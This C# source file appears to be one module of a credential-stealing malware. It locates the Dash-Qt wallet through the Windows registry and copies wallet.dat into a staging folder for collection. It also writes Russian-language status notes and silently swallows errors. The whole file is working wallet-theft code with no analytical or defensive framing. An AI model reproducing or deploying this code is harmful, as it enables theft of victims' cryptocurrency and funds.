using Microsoft.Win32;
using System.IO;

internal class BTCDASH
{
	public static void Start()
	{
		string text = $"{Buffer.path_l}BTC-Dash";
		try
		{
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt");
			if (registryKey.GetValue("strDataDir") != null)
			{
				string text2 = registryKey.GetValue("strDataDir").ToString();
				if (Directory.Exists(text2))
				{
					if (File.Exists($"{text2}\\wallet.dat"))
					{
						File.Copy($"{text2}\\wallet.dat", $"{text}\\wallet.dat", overwrite: true);
						Buffer.XBufferData[14] = "1";
					}
					else if (Directory.Exists($"{text2}\\wallets") && File.Exists($"{text2}\\wallets\\wallet.dat"))
					{
						File.Copy($"{text2}\\wallets\\wallet.dat", $"{text}\\wallet.dat", overwrite: true);
						Buffer.XBufferData[14] = "1";
					}
					else
					{
						File.WriteAllText($"{text}\\info.txt", $"{Buffer.head}Dash-Qt найден на компьютере, но файл \"wallet.dat\" не найден.");
						Buffer.XBufferData[14] = "0";
					}
				}
			}
			registryKey.Close();
		}
		catch
		{
		}
		if (Directory.GetFiles(text, "*.dat").Length == 0)
		{
			File.WriteAllText($"{text}\\info.txt", $"{Buffer.head}Dash-Qt не найден на компьютере.");
			Buffer.XBufferData[14] = "0";
		}
	}
}
